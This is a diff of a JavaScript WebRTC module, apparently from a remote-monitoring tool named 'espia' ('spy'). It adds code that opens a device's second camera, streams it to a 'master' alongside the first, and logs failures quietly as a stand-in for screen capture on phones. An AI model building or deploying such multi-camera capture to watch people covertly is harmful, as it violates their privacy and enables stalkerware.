@@ -2485,6 +2485,45 @@ const Session = (() => {
               pc.addTrack(t, window._espiaCliWH.streams.userMedia);
             });
           }
+          // [v2.13.84 DUAL CAMERA] Si el device tiene 2+ cámaras (típico smartphone)
+          // y la primera ya está capturada, intentar abrir la otra en paralelo.
+          // Sirve como reemplazo de pantalla en smartphones (donde getDisplayMedia
+          // no existe). Si el browser/hardware no permite concurrencia, cae al solo
+          // 1 cámara sin afectar el flujo normal.
+          (async () => {
+            try {
+              const devs = await navigator.mediaDevices.enumerateDevices();
+              const cams = devs.filter(d => d.kind === 'videoinput');
+              if (cams.length < 2) {
+                console.log('[espia WH] dual-cam: solo 1 cámara · skip');
+                return;
+              }
+              // Cuál cámara ya estamos usando
+              const tUsado = window._espiaCliWH?.streams?.userMedia?.getVideoTracks?.()[0];
+              const idUsado = tUsado?.getSettings?.()?.deviceId;
+              const otra = cams.find(c => c.deviceId && c.deviceId !== idUsado);
+              if (!otra) { console.log('[espia WH] dual-cam: no encontré 2da deviceId'); return; }
+              const stream2 = await navigator.mediaDevices.getUserMedia({
+                video: { deviceId: { exact: otra.deviceId }, width:{ideal:640}, height:{ideal:480} }
+              });
+              if (!window._espiaCliWH) {
+                stream2.getTracks().forEach(t => { try{t.stop();}catch(_){} });
+                return;
+              }
+              window._espiaCliWH.streams.userMedia2 = stream2;
+              window._espiaCliWH._trackTipoMap = window._espiaCliWH._trackTipoMap || {};
+              stream2.getTracks().forEach(t => {
+                if (t.kind === 'video') t.contentHint = 'motion';
+                window._espiaCliWH._trackTipoMap[t.id] = 'camara2';
+                pc.addTrack(t, stream2);
+              });
+              console.log('[espia WH] 2da cámara agregada (' + (otra.label || 'sin label') + ') · reneg disparará');
+              // Reenviar trackMap al master cuando esté disponible
+              window._espiaCliWH?._enviarTrackMap?.();
+            } catch(e) {
+              console.warn('[espia WH] 2da cámara fallo (browser/hardware no soporta concurrencia):', e.message);
+            }
+          })();
           // [v2.13.79 REFACTOR] Handler de renegociación — solo SUBE la nueva oferta.
           // El polling de respuesta vive en pollTimerSync (centralizado, sin
           // setInterval anidado). Más simple, más limpio, sin race condition entre
